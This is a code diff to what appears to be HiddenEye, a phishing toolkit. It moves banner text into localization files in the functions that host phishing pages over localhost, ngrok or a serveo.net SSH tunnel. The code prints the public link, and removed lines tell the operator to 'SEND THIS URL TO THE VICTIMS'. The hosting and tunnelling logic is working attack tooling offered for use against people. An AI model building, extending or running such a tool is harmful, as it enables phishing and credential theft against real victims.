@@ -10,7 +10,9 @@ from Defs.ImportManager.unsorted_will_be_replaced import run_command, run_backgr
 import Defs.ThemeManager.theme as theme
 import Defs.ActionManager.Server.server_menu as server_menu
 import Defs.ActionManager.simple_informant as simple_informant
-#import os #DELETEIT
+import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_runner as localization
+import Defs.LocalizationManager.lang_global_usage as global_localization
+
 default_palette = theme.default_palette
 enter_server_www = chdir("Server/www")
 exit_server_www = chdir("../..")
@@ -32,43 +34,53 @@ def start_server(port = 80):
 
 def start_localhost(port):
     run_command('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
-    #print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(default_palette[0], default_palette[4]))
-    #host = input(" \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
+   # print('''
+   #     {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+   #     |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+   #     |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+   #     {0}http://github.com/darksecdevelopers
+   #     {0}** BY:DARKSEC ** \n\n-------------------------------
+   
+   # '')
+    simple_informant.global_message()
+    print(localization.lang_start_localhost["localhost_server"])
     host = simple_informant.get_ip_addr
-    print("Your Localhost is {0}".format(host))
-    set_port
+    print(localization.lang_start_localhost["your_localhost_is"] + host)
+    set_port()
     #run_command("cd Server/www/ 
     # && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
     enter_server_www
     set_php(host, port)
-    print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
-    wait(2)
+    print(localization.lang_start_localhost["starting_server_on_addr"] + "{0}:{1}".format(host, port))
+    #wait(2)
     run_command('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RUNNING LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
-    print("\n{0}[{1}!{0}]{1} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://{4}:{3}\n".format(default_palette[0], default_palette[2], default_palette[3], port, host))
-    print("\n")
-
+    #print('''
+    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+    #    {0}http://github.com/darksecdevelopers
+    #    {0}** BY:DARKSEC ** \n\n-------------------------------
+    # ''')
+    simple_informant.global_message()
+    print(localization.lang_start_localhost["running_localhost_server"])
+    
+    #print("-
+    # ".format(default_palette[0], default_palette[2], default_palette[3], port, host))
+    print(localization.lang_start_localhost["send_this_url_suggestion"])
+    print(localization.lang_start_localhost["localhost_url"] + '{0}:{1}\n'.format(host, port))
 
 def start_ngrok(port):
     run_command(['killall','-2','ngrok'], stdout=DEVNULL, stderr=DEVNULL)
     run_command('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
+    #print('''
+    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+    #    {0}http://github.com/darksecdevelopers
+    #    {0}** BY:DARKSEC ** \n\n-------------------------------
+    # ''')
+    simple_informant.global_message()
+    print(localization.lang_start_ngrok["ngrok_server"])
     #run_command(['./Server/ngrok http {0}'.format(port)], stdout=DEVNULL, stderr=DEVNULL)
     ##chmod('Server', 0o777)
     ##run_command(['Server/ngrok', 'http {0}'.format(port)],stdout=DEVNULL, stderr=DEVNULL)
@@ -85,9 +97,13 @@ def start_ngrok(port):
         url = ngrok_tunnels[0].public_url
         #urlFile.close()
         if regular_expression.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-            print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
-                default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
-            print("\n")
+            #print(\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
+            # \n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
+            #    default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
+            #print("\n")
+            print(localization.lang_start_ngrok["send_this_url_suggestion"])
+            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
+            print(localization.lang_start_ngrok["ngrok_url"] + url + default_palette[4])
             break
 
 
@@ -101,19 +117,31 @@ def start_serveo(port):
 
     def random(port):
         run_command('clear')
-        print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
-        run_command('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
+        #print('''
+        #{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        #|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        #|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        #{0}http://github.com/darksecdevelopers
+        #{0}** BY:DARKSEC ** \n\n-------------------------------
+        # 
+        # ''')
+        simple_informant.global_message()
+        print(localization.lang_start_serveo["serveo_random_server"])
+        
+        #run_command('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
+        run_command(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R','localhost:{0}'.format(port), 'serveo.net', '>', 'link.url'],stdout=DEVNULL, stderr=DEVNULL )
         wait(8)
         try:
             output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
-            print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(default_palette[0], default_palette[4], default_palette[3], port) + url + "{0}".format(default_palette[4]))
-            print("\n")
+            # print("-\n
+            # \n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
+
+            # ".format(default_palette[0], default_palette[4], default_palette[3], port) + url + "{0}".format(default_palette[4]))
+            #print("\n")
+            print(localization.lang_start_serveo["send_this_url_suggestion"])
+            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
+            print(localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
         except CalledProcessError:
 
             wait(4)
